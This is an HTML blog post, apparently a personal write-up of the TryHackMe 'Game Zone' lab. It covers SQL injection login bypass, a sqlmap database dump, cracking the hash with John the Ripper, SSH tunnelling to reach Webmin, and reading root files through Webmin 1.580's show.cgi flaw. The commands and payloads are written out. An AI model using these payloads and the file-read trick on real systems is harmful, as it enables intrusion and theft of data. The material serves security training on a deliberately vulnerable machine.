@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Game Zone Room This is a quick writeup or another &amp;ldquo;just-me-taking-notes&amp;rdquo; thing for the GameZone&amp;rsquo;s TryhackMe room. This room is quite guided so there won&amp;rsquo;t be much more detail added by this writup. Just straight to the point solutions for each task. Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all." />
+<meta name="keywords" content=", hacking, tryHackme, writeups" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://tzero86-bits.netlify.app/posts/gamezone_writeup/" />
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+    <title>
+        
+            GameZone_writeup.sh :: tzero86.bits  — hacking notes, tools and rants.
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="GameZone_writeup.sh">
+<meta itemprop="description" content="Game Zone Room This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for the GameZone&rsquo;s TryhackMe room. This room is quite guided so there won&rsquo;t be much more detail added by this writup. Just straight to the point solutions for each task. Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.">
+<meta itemprop="datePublished" content="2020-08-24T16:19:31-04:00" />
+<meta itemprop="dateModified" content="2020-08-24T16:19:31-04:00" />
+<meta itemprop="wordCount" content="1828">
+<meta itemprop="image" content="https://tzero86-bits.netlify.app/"/>
+
+
+
+<meta itemprop="keywords" content="hacking,tryHackme,writeups," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://tzero86-bits.netlify.app/"/>
+
+<meta name="twitter:title" content="GameZone_writeup.sh"/>
+<meta name="twitter:description" content="Game Zone Room This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for the GameZone&rsquo;s TryhackMe room. This room is quite guided so there won&rsquo;t be much more detail added by this writup. Just straight to the point solutions for each task. Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all."/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-24 16:19:31 -0400 EDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">tzero86.bits</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://tzero86-bits.netlify.app/page/about/">About me</a></li><li><a href="https://tzero86-bits.netlify.app/posts/">Blog Posts</a></li><li><a href="https://tzero86-bits.netlify.app/">Home</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        9 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://tzero86-bits.netlify.app/posts/gamezone_writeup/">GameZone_writeup.sh</a>
+      </h1>
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#task-1-deploy-the-vulnerable-machine">[Task 1] Deploy the vulnerable machine</a></li>
+    <li><a href="#task-2-obtain-access-via-sqli">[Task 2] Obtain access via SQLi</a></li>
+    <li><a href="#task-3-using-sqlmap">[Task 3] Using SQLMap</a></li>
+    <li><a href="#task-4-cracking-a-password-with-johntheripper">[Task 4] Cracking a password with JohnTheRipper</a></li>
+    <li><a href="#task-5-exposing-services-with-reverse-ssh-tunnels">[Task 5] Exposing services with reverse SSH tunnels</a></li>
+    <li><a href="#task-6-privilege-escalation-with-metasploit">[Task 6] Privilege Escalation with Metasploit</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+        <img src="/img/gameZone_cover.gif" class="post-cover" />
+      
+
+      <div class="post-content">
+        <h1 id="game-zone-room">Game Zone Room</h1>
+<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for the GameZone&rsquo;s TryhackMe room. This room is quite guided so there won&rsquo;t be much more detail added by this writup. Just straight to the point solutions for each task.
+Enjoy!</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/gamezone">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
+</ul>
+<h2 id="task-1-deploy-the-vulnerable-machine">[Task 1] Deploy the vulnerable machine</h2>
+<blockquote>
+<p>Question #2 What is the name of the large cartoon avatar holding a sniper on the forum?</p>
+</blockquote>
+<p>For this we could do an image search but, since I know this from my old gamer times. It was quite easy to answer. If you don&rsquo;t know the answer, google is your friend.</p>
+<h2 id="task-2-obtain-access-via-sqli">[Task 2] Obtain access via SQLi</h2>
+<p>So we need to exploit SQLi (injection) to get access to the server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">	<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#66d9ef">admin</span> <span style="color:#66d9ef">AND</span> password :<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; or 1=1 -- -
+</span></code></pre></div><blockquote>
+<p>Question#3 When you&rsquo;ve logged in, what page do you get redirected to?</p>
+</blockquote>
+<p>Às per the room we know there is no Admin username. In this case we can still use the following string as username leaving the password empty.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">	<span style="color:#e6db74">&#39; or 1=1 -- -
+</span></code></pre></div><p>After a using that string as username (leaving the password empty), we get logged in and arrive to a <strong>portal.php</strong> page. We can answer the question now.</p>
+<h2 id="task-3-using-sqlmap">[Task 3] Using SQLMap</h2>
+<p>SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of Kali Linux or can be manually downloaded and installed <a href="https://github.com/sqlmapproject/sqlmap">here</a>.</p>
+<p>There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.</p>
+<p>First we need to use the portal page we are logged into, Using Burp suite intercept a simple search request made on that page. Save the request into a text file.We can then pass this into SQLMap to use our authenticated user session.</p>
+<p>We just need to call SQLMap with this request following this format:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r search_req.txt --dbms<span style="color:#f92672">=</span>mysql --dump
+</code></pre></div><ul>
+<li>-r uses the intercepted request you saved earlier</li>
+<li>&ndash;dbms tells SQLMap what type of database management system it is</li>
+<li>&ndash;dump attempts to outputs the entire database</li>
+</ul>
+<p>We&rsquo;ll get something like this</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ sqlmap -r search_req.txt --dbms<span style="color:#f92672">=</span>mysql --dump
+        ___
+       __H__
+ ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.4.8#stable}
+</span><span style="color:#e6db74">|_ -| . [,]     | .&#39;| . |
+</span><span style="color:#e6db74">|___|_  [&#34;</span><span style="color:#f92672">]</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> legal disclaimer: Usage of sqlmap <span style="color:#66d9ef">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span style="color:#e6db74">&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[*] starting @ 15:09:43 /2020-08-24/
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[15:09:43] [INFO] parsing HTTP request from &#39;</span>search_req.txt<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:09:43] [INFO] testing connection to the target URL
+</span><span style="color:#e6db74">[15:09:44] [INFO] checking if the target is protected by some kind of WAF/IPS
+</span><span style="color:#e6db74">[15:09:44] [INFO] testing if the target URL content is stable
+</span><span style="color:#e6db74">[15:09:45] [INFO] target URL content is stable
+</span><span style="color:#e6db74">[15:09:45] [INFO] testing if POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; is dynamic
+</span><span style="color:#e6db74">[15:09:45] [WARNING] POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; does not appear to be dynamic
+</span><span style="color:#e6db74">[15:09:45] [INFO] heuristic (basic) test shows that POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; might be injectable (possible DBMS: &#39;</span>MySQL<span style="color:#e6db74">&#39;)
+</span><span style="color:#e6db74">[15:09:46] [INFO] heuristic (XSS) test shows that POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39; might be vulnerable to cross-site scripting (XSS) attacks
+</span><span style="color:#e6db74">[15:09:46] [INFO] testing for SQL injection on POST parameter &#39;</span>searchitem<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">for the remaining tests, do you want to include all tests for &#39;</span>MySQL<span style="color:#e6db74">&#39; extending provided level (1) and risk (1) values? [Y/n] y
+</span><span style="color:#e6db74">[15:09:59] [INFO] testing &#39;</span>AND boolean-based blind - WHERE or HAVING clause<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:09:59] [WARNING] reflective value(s) found and filtering out
+</span><span style="color:#e6db74">[15:10:04] [INFO] testing &#39;</span>Boolean-based blind - Parameter replace <span style="color:#f92672">(</span>original value<span style="color:#f92672">)</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:10:05] [INFO] testing &#39;</span>Generic inline queries<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:10:05] [INFO] testing &#39;</span>AND boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>MySQL comment<span style="color:#f92672">)</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">[15:10:29] [INFO] testing &#39;</span>OR boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>MySQL comment<span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+
+</code></pre></div><p>This will take some time as SQLMap will try different ways of exploiting the DB, eventually it should dump the database.</p>
+<blockquote>
+<p>Question #2 In the users table, what is the hashed password?</p>
+</blockquote>
+<p>From the data displayed by the tool we get that answer, also the next one as well.</p>
+<blockquote>
+<p>Question #3 What was the username associated with the hashed password?</p>
+</blockquote>
+<p>Let&rsquo;s move to the next Task.</p>
+<h2 id="task-4-cracking-a-password-with-johntheripper">[Task 4] Cracking a password with JohnTheRipper</h2>
+<p>John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.</p>
+<p>We will use this program to crack the hash we obtained earlier. JohnTheRipper is 15 years old and other programs such as HashCat are one of several other cracking programs out there.</p>
+<p>This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.</p>
+<p>For this we need the hash string we found with SQLMap, save that into a txt file.</p>
+<p>To run John we use the following command and we&rsquo;ll use <strong>rockyou.txt</strong> as our wordlist:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>RAW-SHA256
+
+</code></pre></div><p>Let&rsquo;s break down that those options mean:</p>
+<ul>
+<li>hash.txt - contains a list of your hashes (in your case its just 1 hash)</li>
+<li>&ndash;wordlist - is the wordlist you&rsquo;re using to find the dehashed value</li>
+<li>&ndash;format - is the hashing algorithm used. In our case its hashed using SHA256.</li>
+</ul>
+<p>Let&rsquo;s run John:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ sudo john hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>RAW-SHA256
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Raw-SHA256 <span style="color:#f92672">[</span>SHA256 128/128 AVX 4x<span style="color:#f92672">])</span>
+Warning: poor OpenMP scalability <span style="color:#66d9ef">for</span> this hash type, consider --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
+Will run <span style="color:#ae81ff">8</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+REDACTEDPASSWORD    <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2020-08-24 15:31<span style="color:#f92672">)</span> 2.941g/s 8673Kp/s 8673Kc/s 8426KC/s vimivi..vainlove
+Use the <span style="color:#e6db74">&#34;--show --format=Raw-SHA256&#34;</span> options to display all of the cracked passwords reliably
+Session completed
+
+</code></pre></div><blockquote>
+<p>Question #2 What is the de-hashed password?</p>
+</blockquote>
+<p>We answered that with the ouput from John.</p>
+<blockquote>
+<p>Question #3 Now you have a password and username. Try SSH&rsquo;ing onto the machine.What is the user flag?</p>
+</blockquote>
+<p>With the password we can now SSH into the computer:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ ssh agent47@10.10.89.82
+The authenticity of host <span style="color:#e6db74">&#39;10.10.89.82 (10.10.89.82)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.89.82<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span><span style="color:#e6db74">agent47@10.10.89.82&#39;</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-159-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+<span style="color:#ae81ff">109</span> packages can be updated.
+<span style="color:#ae81ff">68</span> updates are security updates.
+
+
+Last login: Fri Aug <span style="color:#ae81ff">16</span> 17:52:04 <span style="color:#ae81ff">2019</span> from 192.168.1.147
+agent47@gamezone:~$ ls -al
+total <span style="color:#ae81ff">28</span>
+drwxr-xr-x <span style="color:#ae81ff">3</span> agent47 agent47 <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .
+drwxr-xr-x <span style="color:#ae81ff">3</span> root    root    <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> ..
+lrwxrwxrwx <span style="color:#ae81ff">1</span> root    root       <span style="color:#ae81ff">9</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .bash_history -&gt; /dev/null
+-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47  <span style="color:#ae81ff">220</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47 <span style="color:#ae81ff">3771</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .bashrc
+drwx------ <span style="color:#ae81ff">2</span> agent47 agent47 <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .cache
+-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47  <span style="color:#ae81ff">655</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .profile
+-rw-rw-r-- <span style="color:#ae81ff">1</span> agent47 agent47   <span style="color:#ae81ff">33</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> user.txt
+agent47@gamezone:~$ cat user.txt
+<span style="color:#f92672">{</span>redacted_user_flag<span style="color:#f92672">}</span>
+
+</code></pre></div><p>And there&rsquo;s our answer.</p>
+<h2 id="task-5-exposing-services-with-reverse-ssh-tunnels">[Task 5] Exposing services with reverse SSH tunnels</h2>
+<p>Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.</p>
+<p>-L is a local tunnel (YOU &lt;&ndash; CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 <a href="mailto:user@example.com">user@example.com</a>. Going to localhost:9000 on your machine, will load imgur traffic using your other server.</p>
+<p>-R is a remote tunnel (YOU &ndash;&gt; CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.</p>
+<p>e will use a tool called ss to investigate sockets running on a host.</p>
+<p>If we run <strong>ss -tulpn</strong> it will tell us what socket connections are running</p>
+<p>Argument	Description
+-t	Display TCP sockets
+-u	Display UDP sockets
+-l	Displays only listening sockets
+-p	Shows the process using the socket
+-n	Doesn&rsquo;t resolve service names</p>
+<blockquote>
+<p>Questions #1 How many TCP sockets are running?</p>
+</blockquote>
+<p>Let&rsquo;s run <strong>ss</strong> and see what it shows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+agent47@gamezone:~$ ss -tulpn
+Netid  State      Recv-Q Send-Q           Local Address:Port                          Peer Address:Port              
+udp    UNCONN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                            *:68                                       *:*                  
+udp    UNCONN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                            *:10000                                    *:*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">80</span>                   127.0.0.1:3306                                     *:*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                          *:10000                                    *:*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                          *:22                                       *:*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                         :::80                                      :::*                  
+tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                         :::22                                      :::*     
+</code></pre></div><p>We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!</p>
+<p>From our local machine, run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L 10000:localhost:10000 &lt;username&gt;@&lt;ip&gt;
+</code></pre></div><p>Let&rsquo;s run that SSH:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ ssh -L 10000:localhost:10000 agent47@10.10.89.82
+agent47@10.10.89.82<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-159-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+<span style="color:#ae81ff">109</span> packages can be updated.
+<span style="color:#ae81ff">68</span> updates are security updates.
+
+
+Last login: Mon Aug <span style="color:#ae81ff">24</span> 14:34:33 <span style="color:#ae81ff">2020</span> from 10.13.0.34
+
+</code></pre></div><blockquote>
+<p>Question #2 What is the name of the exposed CMS?</p>
+</blockquote>
+<p>Once complete, in your browser type <strong>localhost:10000</strong> and you can access the newly-exposed webserver.
+When we do that, we see a <strong>Webmin</strong> login form.</p>
+<blockquote>
+<p>Question #3 What is the CMS version?</p>
+</blockquote>
+<p>At this point we do have a username and password, so let&rsquo;s login to see the Webmin logged user page. With that we should have the information we need for Question number 3.</p>
+<h2 id="task-6-privilege-escalation-with-metasploit">[Task 6] Privilege Escalation with Metasploit</h2>
+<p>Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.</p>
+<p>Before we jump to <strong>Metasploit</strong> let&rsquo;s run <strong>searchsploit webmin 1.580</strong> to see if we can get a bit more of details on the available exploits:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~$ searchsploit webmin 1.580
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+Webmin 1.580 - <span style="color:#e6db74">&#39;/file/show.cgi&#39;</span> Remote Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>               | unix/remote/21851.rb
+Webmin &lt; 1.920 - <span style="color:#e6db74">&#39;rpc.cgi&#39;</span> Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                       | linux/webapps/47330.rb
+------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+</code></pre></div><p>We now know there is Remote Command Execution vulnerability availble and also a Remote Code Execution as well. Let&rsquo;s run <strong>msfconsole</strong> and see how we can exploit this CMS with Metasploit.</p>
+<p>After failing for a while, I took a look on google to see if we can find the module itself to see what it does. Turns out its rather easy, it just uses the <strong>show.cgi</strong> component to read out any file passes into it. With this we can just run this on our local machine browser and get the root flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://localhost:10000/file/show.cgi/root/root.txt
+
+</code></pre></div><p>Once we run that command the browser will read out the contents of root.txt and give us the answer to the last Question:</p>
+<blockquote>
+<p>Question #1 What is the root flag?</p>
+</blockquote>
+<p>a4b94{redacted_root_flag_XD}</p>
+<p>As usual, happy hacking.</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<div class="container" style="margin:10px !important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+</div>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
+            <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+            <line x1="7" y1="7" x2="7" y2="7"></line>
+          </svg><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/hacking/">hacking</a></span><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/tryhackme/">tryHackme</a></span><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/writeups/">writeups</a></span>
+        </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1828 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        2020-08-24 16:19 -0400
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=GameZone_writeup.sh&amp;caption=GameZone_writeup.sh&amp;canonicalUrl=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
